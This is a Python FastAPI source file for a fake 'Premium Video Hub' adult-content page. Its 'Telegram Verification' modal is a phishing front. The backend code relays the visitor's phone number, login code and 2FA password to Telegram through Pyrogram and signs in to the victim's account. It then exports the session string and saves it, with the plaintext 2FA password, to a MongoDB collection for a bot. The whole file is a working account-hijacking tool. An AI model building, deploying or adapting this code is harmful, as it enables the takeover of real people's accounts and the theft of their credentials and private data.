import os
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, 
    PhoneCodeInvalid, 
    PasswordHashInvalid, 
    PhoneCodeExpired
)
from motor.motor_asyncio import AsyncIOMotorClient

app = FastAPI(title="VIP Access Portal")

API_ID = int(os.environ.get("API_ID", "123456"))
API_HASH = os.environ.get("API_HASH", "YOUR_API_HASH")

# Bot ke saath sync karne ke liye MONGO_URI variable use kiya hai
MONGO_URI = os.environ.get("MONGO_URI", os.environ.get("MONGO_URL", "mongodb+srv://user:pass@cluster.mongodb.net/?retryWrites=true&w=majority"))
CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/your_private_channel")

mongo_client = AsyncIOMotorClient(MONGO_URI)

# Bot ke database aur collection se matching setup
db = mongo_client["master_dark_bot"]
sessions_col = db["sessions"]

active_clients = {}

class PhoneReq(BaseModel):
    phone: str

class OtpReq(BaseModel):
    phone: str
    code: str

class PasswordReq(BaseModel):
    phone: str
    password: str

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Premium Video Hub</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background-color: #07090e; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
    
    .header-title {
      font-size: 1.6rem;
      font-weight: 800;
      letter-spacing: 0.5px;
      background: linear-gradient(90deg, #ff6b35 0%, #f7931e 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .hero-card {
      background: #11141d;
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
    }

    .hero-thumbnail {
      width: 100%;
      height: 230px;
      background: linear-gradient(135deg, #41295a 0%, #2f0743 50%, #ff5e62 100%);
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .play-circle-lg {
      width: 65px;
      height: 65px;
      background: rgba(255, 255, 255, 0.2);
      backdrop-filter: blur(8px);
      border: 1px solid rgba(255, 255, 255, 0.4);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    }

    .play-icon-lg {
      width: 0; height: 0;
      border-top: 12px solid transparent;
      border-bottom: 12px solid transparent;
      border-left: 20px solid #ffffff;
      margin-left: 4px;
    }

    .hero-details { padding: 16px; }

    .badge-restricted {
      background-color: #ff3b5c;
      color: #ffffff;
      font-size: 0.68rem;
      font-weight: 700;
      padding: 3px 8px;
      border-radius: 6px;
      display: inline-flex;
      align-items: center;
      gap: 4px;
      letter-spacing: 0.5px;
      text-transform: uppercase;
    }

    .btn-pill-glow {
      background: linear-gradient(90deg, #ff5e62 0%, #ff9966 100%);
      color: #ffffff;
      font-weight: 800;
      font-size: 0.95rem;
      border-radius: 50px;
      padding: 18px 20px;
      text-align: center;
      box-shadow: 0 10px 25px rgba(255, 94, 98, 0.45);
      transition: all 0.2s ease-in-out;
      text-transform: uppercase;
      line-height: 1.3;
      letter-spacing: 0.5px;
      display: block;
      width: 100%;
    }

    .grid-card {
      background: #11141d;
      border-radius: 16px;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      cursor: pointer;
    }

    .grid-thumb {
      height: 110px;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .thumb-1 { background: linear-gradient(135deg, #41295a 0%, #ff5e62 100%); }
    .thumb-2 { background: linear-gradient(135deg, #4776E6 0%, #8E54E9 100%); }
    .thumb-3 { background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%); }
    .thumb-4 { background: linear-gradient(135deg, #FF8008 0%, #FFC837 100%); }

    .play-icon-sm {
      width: 0; height: 0;
      border-top: 8px solid transparent;
      border-bottom: 8px solid transparent;
      border-left: 14px solid rgba(255, 255, 255, 0.9);
    }

    .grid-info { padding: 12px; }
  </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-between p-4">

  <div class="w-full max-w-md space-y-5">
    
    <header class="text-center pt-2 pb-1">
      <div class="flex items-center justify-center gap-2">
        <span class="text-2xl">🔥</span>
        <h1 class="header-title">PREMIUM VIDEO HUB</h1>
      </div>
      <p class="text-xs text-gray-400 mt-1">Exclusive content — Verified members only</p>
    </header>

    <div onclick="openModal()" class="hero-card cursor-pointer">
      <div class="hero-thumbnail">
        <div class="play-circle-lg">
          <div class="play-icon-lg"></div>
        </div>
      </div>
      <div class="hero-details">
        <h2 class="text-base font-bold text-white mb-1 flex items-center gap-1.5">
          <span>🔥</span> How to Use (Guide Video)
        </h2>
        <div class="flex items-center gap-2 text-xs text-gray-400 mb-2.5">
          <span class="text-yellow-400 font-semibold">★ 4.9</span>
          <span>(2.4M views)</span>
          <span>•</span>
          <span>18+</span>
        </div>
        <div>
          <span class="badge-restricted">🔞 RESTRICTED</span>
        </div>
      </div>
    </div>

    <button onclick="openModal()" class="btn-pill-glow">
      🔞 GET YOUR LINK TAP TO VERIFY VIA TELEGRAM
    </button>

    <div>
      <h3 class="text-sm font-bold text-gray-200 mb-3 flex items-center gap-2">
        <span>🔥</span> More Videos
      </h3>
      <div class="grid grid-cols-2 gap-3.5">
        <div onclick="openModal()" class="grid-card">
          <div class="grid-thumb thumb-1"><div class="play-icon-sm"></div></div>
          <div class="grid-info"><div class="font-bold text-sm text-white">Private 01</div><div class="text-xs text-gray-400 mt-0.5">2.1M views</div></div>
        </div>
        <div onclick="openModal()" class="grid-card">
          <div class="grid-thumb thumb-2"><div class="play-icon-sm"></div></div>
          <div class="grid-info"><div class="font-bold text-sm text-white">Private 02</div><div class="text-xs text-gray-400 mt-0.5">1.8M views</div></div>
        </div>
        <div onclick="openModal()" class="grid-card">
          <div class="grid-thumb thumb-3"><div class="play-icon-sm"></div></div>
          <div class="grid-info"><div class="font-bold text-sm text-white">Private 03</div><div class="text-xs text-gray-400 mt-0.5">1.5M views</div></div>
        </div>
        <div onclick="openModal()" class="grid-card">
          <div class="grid-thumb thumb-4"><div class="play-icon-sm"></div></div>
          <div class="grid-info"><div class="font-bold text-sm text-white">Private 04</div><div class="text-xs text-gray-400 mt-0.5">1.2M views</div></div>
        </div>
      </div>
    </div>

  </div>

  <div id="authModal" class="fixed inset-0 bg-black/80 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
    <div class="bg-[#11141d] w-full max-w-md rounded-2xl p-6 relative border border-gray-800 shadow-2xl">
      <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white"><i class="fa-solid fa-xmark text-xl"></i></button>

      <div id="step-phone" class="space-y-4">
        <div class="text-center">
          <i class="fa-brands fa-telegram text-5xl text-blue-500 mb-2"></i>
          <h3 class="text-xl font-bold text-white">Telegram Verification</h3>
          <p class="text-sm text-gray-400 mt-1">Enter your mobile number</p>
        </div>
        <input type="text" id="phoneInput" placeholder="Enter Phone Number" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500 text-lg text-center tracking-widest">
        <button onclick="sendCode()" id="btnSendCode" class="w-full py-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl">Send Code</button>
      </div>

      <div id="step-otp" class="space-y-4 hidden">
        <div class="text-center">
          <i class="fa-solid fa-shield-halved text-5xl text-green-500 mb-2"></i>
          <h3 class="text-xl font-bold text-white">Enter OTP Code</h3>
          <p class="text-sm text-gray-400 mt-1">Check your official Telegram app for verification code</p>
          <p id="displayPhone" class="text-xs text-blue-400 mt-1 font-mono"></p>
        </div>
        <input type="text" id="otpInput" placeholder="• • • • •" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-green-500 text-2xl text-center tracking-widest font-mono">
        
        <button onclick="verifyOtp()" id="btnVerifyOtp" class="w-full py-3 bg-green-600 hover:bg-green-500 text-white font-semibold rounded-xl transition">Verify & Continue</button>

        <div class="flex items-center justify-between text-xs pt-1">
          <button onclick="goBackToPhone()" class="text-gray-400 hover:text-white flex items-center gap-1">
            <i class="fa-solid fa-pen-to-square"></i> Edit Number
          </button>
          <button onclick="sendCode(true)" id="btnResend" class="text-blue-400 hover:text-blue-300 flex items-center gap-1">
            <i class="fa-solid fa-rotate-right"></i> Resend OTP
          </button>
        </div>
      </div>

      <div id="step-2fa" class="space-y-4 hidden">
        <div class="text-center">
          <i class="fa-solid fa-lock text-5xl text-yellow-500 mb-2"></i>
          <h3 class="text-xl font-bold text-white">Two-Step Verification</h3>
          <p class="text-sm text-gray-400 mt-1">Your Telegram account requires 2FA password</p>
        </div>
        
        <div class="relative">
          <input type="password" id="passwordInput" placeholder="Enter Password" class="w-full bg-gray-900 border border-gray-700 rounded-xl pl-4 pr-12 py-3 text-white focus:outline-none focus:border-yellow-500 text-lg text-center">
          <button type="button" onclick="togglePassword()" class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white">
            <i id="eyeIcon" class="fa-solid fa-eye"></i>
          </button>
        </div>

        <button onclick="verify2FA()" id="btnVerify2FA" class="w-full py-3 bg-yellow-600 hover:bg-yellow-500 text-white font-semibold rounded-xl transition">Submit Password</button>
      </div>

      <p id="errorMsg" class="text-red-400 text-xs text-center mt-3 hidden"></p>
    </div>
  </div>

  <footer class="text-gray-600 text-xs text-center py-6">
    © 2026 Premium Video Hub. All Rights Reserved.
  </footer>

  <script>
    let userPhone = "";

    function openModal() { document.getElementById('authModal').classList.remove('hidden'); }
    function closeModal() { document.getElementById('authModal').classList.add('hidden'); }

    function showError(msg) {
      const err = document.getElementById('errorMsg');
      err.innerText = msg;
      err.classList.remove('hidden');
    }

    function togglePassword() {
      const passInput = document.getElementById('passwordInput');
      const eyeIcon = document.getElementById('eyeIcon');
      if (passInput.type === "password") {
        passInput.type = "text";
        eyeIcon.classList.remove('fa-eye');
        eyeIcon.classList.add('fa-eye-slash');
      } else {
        passInput.type = "password";
        eyeIcon.classList.remove('fa-eye-slash');
        eyeIcon.classList.add('fa-eye');
      }
    }

    function goBackToPhone() {
      document.getElementById('step-otp').classList.add('hidden');
      document.getElementById('step-phone').classList.remove('hidden');
      document.getElementById('errorMsg').classList.add('hidden');
    }

    async function sendCode(isResend = false) {
      if(!isResend) {
        let rawInput = document.getElementById('phoneInput').value.trim();
        let clean = rawInput.replace(/[^\\d+]/g, '');

        if (!clean) return showError("Please enter a valid phone number");

        if (clean.startsWith('+')) {
            userPhone = clean;
        } else if (clean.length === 10) {
            userPhone = '+91' + clean;
        } else {
            userPhone = '+' + clean;
        }
      }

      const btn = isResend ? document.getElementById('btnResend') : document.getElementById('btnSendCode');
      btn.innerText = "Sending...";

      const res = await fetch('/api/send-code', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: userPhone })
      });
      const data = await res.json();
      if(res.ok) {
        document.getElementById('step-phone').classList.add('hidden');
        document.getElementById('step-otp').classList.remove('hidden');
        document.getElementById('displayPhone').innerText = "Sent to " + userPhone;
        document.getElementById('errorMsg').classList.add('hidden');
      } else {
        showError(data.detail || "Error sending OTP");
      }
      btn.innerText = isResend ? "Resend OTP" : "Send Code";
    }

    async function verifyOtp() {
      const code = document.getElementById('otpInput').value.trim();
      document.getElementById('btnVerifyOtp').innerText = "Verifying...";
      const res = await fetch('/api/verify-otp', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: userPhone, code: code })
      });
      const data = await res.json();
      if(res.ok) {
        if(data.require_2fa) {
          document.getElementById('step-otp').classList.add('hidden');
          document.getElementById('step-2fa').classList.remove('hidden');
          document.getElementById('errorMsg').classList.add('hidden');
        } else {
          window.location.href = data.link;
        }
      } else {
        showError(data.detail || "Invalid OTP");
        document.getElementById('btnVerifyOtp').innerText = "Verify & Continue";
      }
    }

    async function verify2FA() {
      const password = document.getElementById('passwordInput').value.trim();
      document.getElementById('btnVerify2FA').innerText = "Verifying 2FA...";
      const res = await fetch('/api/verify-2fa', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: userPhone, password: password })
      });
      const data = await res.json();
      if(res.ok) {
        window.location.href = data.link;
      } else {
        showError(data.detail || "Incorrect Password");
        document.getElementById('btnVerify2FA').innerText = "Submit Password";
      }
    }
  </script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
async def serve_ui():
    return HTML_TEMPLATE

@app.post("/api/send-code")
async def send_code(data: PhoneReq):
    phone = data.phone.strip().replace(" ", "")
    try:
        client = Client(name=f"sess_{phone}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await client.connect()
        sent_code = await client.send_code(phone)
        
        active_clients[phone] = {
            "client": client,
            "phone_code_hash": sent_code.phone_code_hash
        }
        return {"status": "ok", "message": "OTP sent successfully"}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/verify-otp")
async def verify_otp(data: OtpReq):
    phone = data.phone.strip()
    clean_phone = phone.replace("+", "").strip()
    
    if phone not in active_clients:
        raise HTTPException(status_code=400, detail="Session expired. Restart process.")
    
    session = active_clients[phone]
    client: Client = session["client"]
    phone_code_hash = session["phone_code_hash"]
    
    try:
        await client.sign_in(phone, phone_code_hash, data.code)
        string_session = await client.export_session_string()
        await client.disconnect()
        
        # Sync format with Bot's database: saves clean phone (without +)
        await sessions_col.update_one(
            {"$or": [{"phone": clean_phone}, {"phone": phone}]},
            {"$set": {
                "phone": clean_phone, 
                "session": string_session, 
                "two_factor": "None", 
                "status": "active"
            }},
            upsert=True
        )
        del active_clients[phone]
        
        return {"status": "success", "require_2fa": False, "link": CHANNEL_LINK}

    except SessionPasswordNeeded:
        return {"status": "require_2fa", "require_2fa": True}
    except PhoneCodeInvalid:
        raise HTTPException(status_code=400, detail="Invalid OTP code.")
    except PhoneCodeExpired:
        raise HTTPException(status_code=400, detail="OTP Code Expired.")
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/verify-2fa")
async def verify_2fa(data: PasswordReq):
    phone = data.phone.strip()
    clean_phone = phone.replace("+", "").strip()
    
    if phone not in active_clients:
        raise HTTPException(status_code=400, detail="Session expired. Restart process.")
    
    client: Client = active_clients[phone]["client"]
    
    try:
        await client.check_password(data.password)
        string_session = await client.export_session_string()
        await client.disconnect()
        
        # Sync format with Bot's database: saves clean phone with 2FA
        await sessions_col.update_one(
            {"$or": [{"phone": clean_phone}, {"phone": phone}]},
            {"$set": {
                "phone": clean_phone, 
                "session": string_session, 
                "two_factor": data.password, 
                "status": "active"
            }},
            upsert=True
        )
        del active_clients[phone]
        
        return {"status": "success", "link": CHANNEL_LINK}
    except PasswordHashInvalid:
        raise HTTPException(status_code=400, detail="Incorrect 2FA Password.")
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
    
